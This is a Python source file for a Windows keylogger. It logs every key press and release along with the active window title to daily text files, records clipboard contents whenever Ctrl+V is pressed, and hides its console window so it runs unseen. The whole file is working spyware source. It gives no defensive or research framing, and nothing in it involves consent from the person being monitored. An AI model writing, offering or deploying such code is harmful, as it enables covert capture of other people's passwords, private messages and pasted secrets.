from pynput import keyboard
import datetime
import os
import ctypes

def get_active_window_title():
    user32 = ctypes.windll.user32
    hwnd = user32.GetForegroundWindow()
    length = user32.GetWindowTextLengthW(hwnd)
    buff = ctypes.create_unicode_buffer(length + 1)
    user32.GetWindowTextW(hwnd, buff, length + 1)
    return buff.value if buff.value else "Unknown Window"

def get_clipboard_content():
    try:
        import win32clipboard
        win32clipboard.OpenClipboard()
        data = win32clipboard.GetClipboardData()
        win32clipboard.CloseClipboard()
        return data
    except Exception:
        return "[Clipboard read error]"

def hide_console():
    try:
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except Exception:
        pass

def get_log_filename():
    date_str = datetime.datetime.now().strftime('%Y%m%d')
    return f"keylog_{date_str}.txt"

def log_event(event_type, key, window_title, extra_info=""):
    timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    log_entry = f'[{timestamp}] [{window_title}] {event_type}: {key} {extra_info}\n'
    print(log_entry.strip())
    with open(get_log_filename(), 'a', encoding='utf-8') as logkey:
        logkey.write(log_entry)

pressed_keys = set()

def on_press(key):
    window_title = get_active_window_title()
    try:
        key_str = key.char
    except AttributeError:
        key_str = str(key)
    pressed_keys.add(key)
    log_event("Pressed", key_str, window_title)

    # Detect Ctrl+V for clipboard logging
    if keyboard.Key.ctrl_l in pressed_keys or keyboard.Key.ctrl_r in pressed_keys:
        if key == keyboard.KeyCode.from_char('v'):
            clipboard_content = get_clipboard_content()
            log_event("Clipboard Paste", "Ctrl+V", window_title, f"Content: {clipboard_content}")

def on_release(key):
    window_title = get_active_window_title()
    try:
        key_str = key.char
    except AttributeError:
        key_str = str(key)
    log_event("Released", key_str, window_title)
    if key in pressed_keys:
        pressed_keys.remove(key)
    # Stop listener with ESC
    if key == keyboard.Key.esc:
        return False

if __name__ == "__main__":
    hide_console()  # Comment this out if you want to see the console window
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
